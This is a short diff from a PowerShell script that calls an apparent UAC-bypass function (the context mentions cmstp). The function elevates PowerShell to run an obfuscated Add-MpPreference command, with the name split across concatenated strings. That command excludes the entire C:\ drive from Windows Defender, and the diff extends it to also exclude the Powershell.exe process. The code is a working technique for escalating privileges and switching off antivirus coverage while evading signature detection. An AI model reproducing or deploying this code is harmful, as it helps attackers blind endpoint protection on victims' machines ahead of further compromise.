@@ -180,4 +180,4 @@ if ($latencyxProcess -eq "cmstp") {
 }
 
 # Function Call
-latencyx-Invoke-UAC -latencyxExecutable "powershell" -latencyxCommand ".('Add-MpP' + 'reference') -ExclusionPath C:\"
+latencyx-Invoke-UAC -latencyxExecutable "powershell" -latencyxCommand ".('Add-MpP' + 'reference') -ExclusionPath C:\ -ExclusionProcess Powershell.exe"
